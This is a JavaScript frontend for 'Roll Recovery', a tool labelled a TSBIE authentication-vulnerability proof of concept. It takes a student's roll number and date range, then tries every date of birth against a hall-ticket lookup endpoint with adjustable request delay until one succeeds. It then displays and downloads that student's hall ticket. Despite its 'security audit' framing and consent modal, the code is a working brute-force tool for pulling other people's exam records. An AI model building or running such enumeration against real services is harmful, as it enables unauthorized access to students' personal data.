/**
 * Roll Recovery — Frontend Controller
 * TSBIE Auth Vulnerability PoC · Security Research Tool
 *
 * Features:
 *   - Confirmation modal gate (must accept before using)
 *   - Elapsed time tracking
 *   - New Scan button
 *   - Nav status indicator
 *   - SSE mode (localhost) + Polling mode (Vercel)
 */

const $ = (id) => document.getElementById(id);

// ─── Modal Elements ───────────────────────────────────────────────────────────

const confirmModal  = $('confirmModal');
const mainApp       = $('mainApp');
const modalConsent  = $('modalConsent');
const modalAcceptBtn = $('modalAcceptBtn');

// ─── App Elements ─────────────────────────────────────────────────────────────

const scanForm        = $('scanForm');
const startBtn        = $('startBtn');
const cancelBtn       = $('cancelBtn');
const progressSection = $('progressSection');
const resultSection   = $('resultSection');
const terminalBody    = $('terminalBody');
const progressBar     = $('progressBar');
const delaySlider     = $('delay');
const delayDisplay    = $('delayValue');
const logCountEl      = $('logCount');
const navStatusEl     = $('navStatus');

let eventSource     = null;
let scanRunning     = false;
let cancelRequested = false;
let foundData       = null;
let logEntryCount   = 0;
let scanStartTime   = null;
let elapsedInterval = null;

const IS_VERCEL = !['localhost', '127.0.0.1'].includes(location.hostname);

// ─── Modal Gate ───────────────────────────────────────────────────────────────

modalConsent.addEventListener('change', function () {
  modalAcceptBtn.disabled = !this.checked;
  const hint = document.querySelector('.modal-hint');
  if (this.checked) {
    hint.textContent = 'Click the button below to proceed';
    hint.style.color = '#22c55e';
  } else {
    hint.textContent = 'You must accept the terms to proceed';
    hint.style.color = '';
  }
});

modalAcceptBtn.addEventListener('click', () => {
  if (!modalConsent.checked) return;
  confirmModal.style.animation = 'fadeOut 0.3s ease forwards';
  setTimeout(() => {
    confirmModal.style.display = 'none';
    mainApp.style.display = '';
    mainApp.style.animation = 'fadeIn 0.5s ease';
  }, 280);
});

// Check if user already accepted (session storage)
if (sessionStorage.getItem('roll-recovery-accepted') === 'true') {
  confirmModal.style.display = 'none';
  mainApp.style.display = '';
}

// Save acceptance
modalAcceptBtn.addEventListener('click', () => {
  sessionStorage.setItem('roll-recovery-accepted', 'true');
});

// ─── Delay slider ─────────────────────────────────────────────────────────────

delaySlider.addEventListener('input', () => {
  const ms = parseInt(delaySlider.value);
  delayDisplay.textContent = ms === 0 ? '0ms' : `${ms}ms`;
});

// ─── Form submit ──────────────────────────────────────────────────────────────

scanForm.addEventListener('submit', (e) => {
  e.preventDefault();
  startScan();
});

// ─── Cancel ───────────────────────────────────────────────────────────────────

cancelBtn.addEventListener('click', () => {
  cancelRequested = true;
  if (eventSource) {
    eventSource.close();
    eventSource = null;
  }
  stopTimer();
  resetControls();
  log('Audit cancelled by user.', 'warning');
  setBadge('Cancelled', 'warn');
  setNavStatus('Cancelled', 'amber');
});

// ─── Download ─────────────────────────────────────────────────────────────────

$('downloadBtn').addEventListener('click', () => {
  if (!foundData) return;
  const ext  = foundData.contentType?.includes('pdf') ? 'pdf' : 'html';
  const blob = new Blob([foundData.html], { type: foundData.contentType || 'text/html' });
  const url  = URL.createObjectURL(blob);
  const a    = Object.assign(document.createElement('a'), {
    href:     url,
    download: `HALLTICKET_${foundData.roll}_${foundData.dob.replace(/\//g, '-')}.${ext}`,
  });
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
});

// ─── Preview toggle ───────────────────────────────────────────────────────────

$('viewBtn').addEventListener('click', () => {
  if (!foundData) return;
  const container = $('hallTicketPreview');
  if (container.querySelector('iframe')) {
    container.innerHTML = '';
    $('viewBtn').innerHTML = eyeSVG() + ' Preview';
    return;
  }
  const blob   = new Blob([foundData.html], { type: 'text/html' });
  const iframe = Object.assign(document.createElement('iframe'), {
    src:     URL.createObjectURL(blob),
    sandbox: 'allow-same-origin',
  });
  container.innerHTML = '';
  container.appendChild(iframe);
  $('viewBtn').innerHTML = eyeSVG() + ' Hide';
});

// ─── New Scan ─────────────────────────────────────────────────────────────────

$('newScanBtn').addEventListener('click', () => {
  resultSection.classList.add('hidden');
  progressSection.classList.add('hidden');
  $('hallTicketPreview').innerHTML = '';
  $('roll').value = '';
  $('roll').focus();
  foundData = null;
  setNavStatus('Ready', 'green');
});

// ─── Elapsed Timer ────────────────────────────────────────────────────────────

function startTimer() {
  scanStartTime = Date.now();
  elapsedInterval = setInterval(() => {
    const elapsed = Math.floor((Date.now() - scanStartTime) / 1000);
    const mins = Math.floor(elapsed / 60);
    const secs = elapsed % 60;
    $('elapsedTime').textContent = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
  }, 1000);
}

function stopTimer() {
  if (elapsedInterval) {
    clearInterval(elapsedInterval);
    elapsedInterval = null;
  }
}

function getElapsedStr() {
  if (!scanStartTime) return '0s';
  const elapsed = Math.floor((Date.now() - scanStartTime) / 1000);
  const mins = Math.floor(elapsed / 60);
  const secs = elapsed % 60;
  return mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
}

// ─── Nav Status ───────────────────────────────────────────────────────────────

function setNavStatus(text, color) {
  if (!navStatusEl) return;
  const dot = navStatusEl.querySelector('.nav-status-dot');
  navStatusEl.childNodes[navStatusEl.childNodes.length - 1].textContent = ' ' + text;
  if (dot) {
    const colors = { green: '#22c55e', amber: '#f59e0b', red: '#ef4444', blue: '#3b82f6' };
    dot.style.background = colors[color] || colors.green;
  }
}

// ─── Main entry ───────────────────────────────────────────────────────────────

function startScan() {
  const roll      = $('roll').value.trim();
  const startDate = $('startDate').value;
  const endDate   = $('endDate').value;
  const delay     = parseInt(delaySlider.value);

  if (!roll) { shake($('roll')); return; }

  foundData       = null;
  cancelRequested = false;
  logEntryCount   = 0;

  resultSection.classList.add('hidden');
  $('hallTicketPreview').innerHTML = '';
  progressSection.classList.remove('hidden');
  terminalBody.innerHTML = '';
  progressBar.style.width      = '0%';
  progressBar.style.background = '';
  $('attemptCount').textContent    = '0';
  $('progressPercent').textContent = '0%';
  $('currentDob').textContent      = '...';
  $('elapsedTime').textContent     = '0s';
  updateLogCount();
  setBadge('Connecting', '');
  setNavStatus('Scanning', 'blue');

  startBtn.disabled = true;
  startBtn.classList.add('btn-scanning');
  startBtn.innerHTML = playSVG() + ' Scanning...';
  cancelBtn.disabled = false;

  startTimer();

  setTimeout(() => progressSection.scrollIntoView({ behavior: 'smooth', block: 'start' }), 100);

  if (IS_VERCEL) {
    startPolling(roll, startDate, endDate, delay);
  } else {
    startSSE(roll, startDate, endDate, delay);
  }
}

// ─── Mode 1: SSE (localhost) ──────────────────────────────────────────────────

function startSSE(roll, startDate, endDate, delay) {
  const params  = new URLSearchParams({ roll, startDate, endDate, delay });
  eventSource   = new EventSource(`/api/scan?${params}`);

  eventSource.addEventListener('init', () => {
    setBadge('Running', '');
    log('Connected. Starting security audit...', 'success');
  });

  eventSource.addEventListener('status', (e) => {
    const d = JSON.parse(e.data);
    log(d.message, d.type);
  });

  eventSource.addEventListener('attempt', (e) => {
    const d = JSON.parse(e.data);
    $('attemptCount').textContent    = d.count;
    $('progressPercent').textContent = `${d.progress}%`;
    $('currentDob').textContent      = d.dob;
    setBadge('Scanning', '');
    progressBar.style.width = `${d.progress}%`;
    log(`Testing ${d.dob} ... [Status: 404]`, 'attempt');
  });

  eventSource.addEventListener('fail', (e) => {
    const d = JSON.parse(e.data);
    log(`Testing ${d.dob} ... [Status: 404]`, 'fail');
  });

  eventSource.addEventListener('found', (e) => {
    const d = JSON.parse(e.data);
    foundData = d;
    log('', 'dim');
    log(`Match confirmed — DOB: ${d.dob} [Status: 200]`, 'found');
    log('Hall ticket record retrieved successfully.', 'success');
    showResult(d.roll, d.dob);
  });

  eventSource.addEventListener('scan_error', (e) => {
    const d = JSON.parse(e.data);
    log(`Error: ${d.message}`, 'error');
  });

  eventSource.addEventListener('done', (e) => {
    const d = JSON.parse(e.data);
    if (eventSource) { eventSource.close(); eventSource = null; }
    stopTimer();

    if (d.success) {
      setBadge('Found', 'ok');
      setNavStatus('Found', 'green');
      progressBar.style.width      = '100%';
      progressBar.style.background = 'linear-gradient(90deg, #22c55e, #10b981)';
    } else {
      const labels = {
        cancelled:    'Cancelled',
        rate_limited: 'Rate Limited',
        not_found:    'Not Found',
        error:        'Error',
      };
      setBadge(labels[d.reason] || 'Done', 'warn');
      setNavStatus(labels[d.reason] || 'Done', 'amber');
    }
    resetControls();
  });

  eventSource.onerror = () => {
    log('Connection lost. Please retry.', 'warning');
    if (eventSource) { eventSource.close(); eventSource = null; }
    stopTimer();
    resetControls();
    setBadge('Disconnected', 'warn');
    setNavStatus('Disconnected', 'red');
  };
}

// ─── Mode 2: Polling (Vercel) ─────────────────────────────────────────────────

async function startPolling(roll, startDateStr, endDateStr, delayMs) {
  scanRunning = true;

  const start     = parseDate(startDateStr);
  const end       = parseDate(endDateStr);
  const totalDays = Math.round((end - start) / 86400000) + 1;

  log(`Target roll number: ${roll}`, 'info');
  log(`Audit range: ${fmtDate(start)} → ${fmtDate(end)} (${totalDays} dates)`, 'info');
  log(`Request interval: ${delayMs}ms`, 'info');
  log('Initiating automated recovery audit...', 'success');

  setBadge('Running', '');

  let current = new Date(start);
  let count   = 0;

  while (current <= end && !cancelRequested) {
    count++;
    const dob      = fmtDate(current);
    const progress = Math.round((count / totalDays) * 100);

    $('attemptCount').textContent    = count;
    $('progressPercent').textContent = `${progress}%`;
    $('currentDob').textContent      = dob;
    progressBar.style.width          = `${progress}%`;
    setBadge('Scanning', '');

    try {
      const res = await fetch('/api/scan', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ roll, dob }),
      });

      if (!res.ok) {
        log(`Testing ${dob} ... [Status: ${res.status}]`, 'error');
        current.setDate(current.getDate() + 1);
        continue;
      }

      const data = await res.json();

      if (data.rateLimited) {
        log('Rate limiting detected by server. Halting audit.', 'error');
        setBadge('Rate Limited', 'warn');
        setNavStatus('Rate Limited', 'red');
        break;
      }

      if (data.success) {
        foundData = { roll, dob, html: data.html, contentType: data.contentType };
        log('', 'dim');
        log(`Match confirmed — DOB: ${dob} [Status: 200]`, 'found');
        log('Hall ticket record retrieved successfully.', 'success');
        setBadge('Found', 'ok');
        setNavStatus('Found', 'green');
        progressBar.style.width      = '100%';
        progressBar.style.background = 'linear-gradient(90deg, #22c55e, #10b981)';
        showResult(roll, dob);
        stopTimer();
        resetControls();
        scanRunning = false;
        return;
      } else {
        log(`Testing ${dob} ... [Status: 404]`, 'attempt');
      }
    } catch (err) {
      log(`Testing ${dob} ... [Error: ${err.message}]`, 'error');
    }

    current.setDate(current.getDate() + 1);

    if (current <= end && !cancelRequested && delayMs > 0) {
      await sleep(delayMs);
    }
  }

  stopTimer();

  if (cancelRequested) {
    log('Audit cancelled by user.', 'warning');
    setBadge('Cancelled', 'warn');
    setNavStatus('Cancelled', 'amber');
  } else if (current > end) {
    log('Audit complete. No matching record found in the specified range.', 'warning');
    setBadge('Not Found', 'warn');
    setNavStatus('Not Found', 'amber');
  }

  resetControls();
  scanRunning = false;
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function showResult(roll, dob) {
  $('resultRoll').textContent     = roll;
  $('resultDob').textContent      = dob;
  $('resultAttempts').textContent  = $('attemptCount').textContent;
  $('resultTime').textContent      = getElapsedStr();
  resultSection.classList.remove('hidden');
  setTimeout(() => resultSection.scrollIntoView({ behavior: 'smooth', block: 'start' }), 200);
}

function resetControls() {
  startBtn.disabled = false;
  startBtn.classList.remove('btn-scanning');
  startBtn.innerHTML = playSVG() + ' Launch Scan';
  cancelBtn.disabled = true;
}

function setBadge(text, type) {
  const el = $('scanStatus');
  el.textContent = text;
  el.className   = 'status-badge' + (type ? ` status-badge-${type}` : '');
}

function log(text, cls = 'dim') {
  if (text === '') {
    const spacer = document.createElement('div');
    spacer.style.height = '4px';
    terminalBody.appendChild(spacer);
    return;
  }

  logEntryCount++;
  updateLogCount();

  const line = document.createElement('div');
  line.className   = `log-entry log-${cls}`;
  line.textContent = text;
  terminalBody.appendChild(line);
  terminalBody.scrollTop = terminalBody.scrollHeight;

  while (terminalBody.children.length > 500) {
    terminalBody.removeChild(terminalBody.firstChild);
  }
}

function updateLogCount() {
  if (logCountEl) {
    logCountEl.textContent = logEntryCount === 1 ? '1 entry' : `${logEntryCount} entries`;
  }
}

function playSVG() {
  return '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>';
}

function eyeSVG() {
  return '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
}

function shake(el) {
  el.style.animation   = 'none';
  void el.offsetHeight;
  el.style.animation   = 'shake 0.35s ease';
  el.style.borderColor = '#ef4444';
  setTimeout(() => {
    el.style.borderColor = '';
    el.style.animation   = '';
  }, 800);
}

function fmtDate(d) {
  return `${String(d.getDate()).padStart(2, '0')}/${String(d.getMonth() + 1).padStart(2, '0')}/${d.getFullYear()}`;
}

function parseDate(str) {
  const [y, m, d] = str.split('-').map(Number);
  return new Date(y, m - 1, d);
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
